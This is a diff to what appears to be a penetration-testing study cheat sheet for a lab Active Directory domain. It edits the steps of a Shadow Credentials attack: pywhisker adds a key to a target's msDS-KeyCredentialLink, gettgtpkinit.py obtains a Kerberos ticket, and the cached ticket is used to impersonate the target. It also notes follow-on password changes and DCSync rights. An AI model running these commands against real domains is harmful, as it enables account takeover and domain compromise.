@@ -316,9 +316,13 @@ dir \\dc01\julio
   # AD attack abusing msDS-KeyCredentialLink stores public keys , we abusing it by replacing it with our public key
   [+] BloodHound: AddKeyCredentialLink # USER1 -> AddKeyCredentialLink -> USER2 (can login via PKINIT)
   # perform Shadow Credentials attack to generates an X.509 certificate
-  pywhisker --dc-ip <DC01-IP> -d INLANEFREIGHT.LOCAL -u <USER1> -p 'PASS' --target <USER2> --action add #=> cert..pfx
+  pywhisker --dc-ip <DC01-IP> -d INLANEFREIGHT.LOCAL -u <USER1> -p 'PASS' --target <USER2> --action add #=> cert.pfx
+# 📦 cert.pfx (certificate file protected with password ex."cert-pass" )
+    # ├── 🔑 Private Key  (yours, stays with you)
+    # └── 📜 Public Key   (was written into target's msDS-KeyCredentialLink)
+     
   # get the tgt from the cert
-  python3 gettgtpkinit.py -cert-pfx ./cert.pfx -pfx-pass 'cert-pass' -dc-ip <DC01-ip> INLANEFREIGHT.LOCAL/USER2 /tmp/USER2.ccache
+  python3 gettgtpkinit.py -cert-pfx ./cert.pfx -pfx-pass '<cert-pass>' -dc-ip <DC01-ip> INLANEFREIGHT.LOCAL/USER2 /tmp/USER2.ccache
   export KRB5CCNAME=/tmp/USER2.ccache
   klist #=> USER2@INLANEFREIGHT.LOCAL
 
@@ -344,4 +348,10 @@ dir \\dc01\julio
 # → Auth via LDAPS using the cert (not Kerberos)  
 # → Can change passwords, add DCSync rights, etc.  
 # Useful when PKINIT fails, worth learning (https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html) 
+
+the full attack explined in the html file
+
 ```
+
+
+
